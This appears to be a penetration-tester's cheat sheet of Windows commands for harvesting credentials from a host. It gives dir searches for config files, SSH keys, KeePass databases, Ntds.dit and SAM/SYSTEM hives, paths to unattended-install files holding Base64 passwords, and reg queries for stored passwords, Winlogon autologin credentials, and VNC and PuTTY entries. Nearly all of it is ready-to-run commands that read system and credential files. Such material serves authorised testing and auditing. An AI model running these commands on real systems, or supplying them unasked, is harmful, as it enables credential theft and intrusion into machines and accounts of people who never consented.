# Important Files

## Files

### Config files

```
dir /s/b /A:-D RDCMan.settings == .ht* == .git* == *.ini == *.inf == *c*nf* == *.rdp == *vnc* == *.txt == *.sav == *.bak 2>nul
```

Typical files

```
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

### Unattended credentials

```
dir /s *ysprep.inf *ysprep.xml *nattended.xml *nattend.xml *nattend.txt 2>nul
```

Typical files. Passwords may be stored in Base64

```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
```

### SAM & SYSTEM backups

```bash
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\repair\sam
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\RegBack\sam
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\System32\config\sam
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```

## Registry

### Search for passwords

```
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
```

### Autologin info

#### Iterate on subkeys

```
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" /reg:64 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"
```

#### Manual way

Try with or without `/reg:64` option if nothing comes up

```
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```

### Program entries

#### VNC

```
reg query "HKCU\Software\ORL\WinVNC3\Password"
```

#### Putty

```
reg query HKCU\Software\SimonTatham\PuTTY\Sessions /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername"
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
reg query HKCU\Software\OpenSSH\Agent\Keys
```

#### SNMP

```
reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP"
```
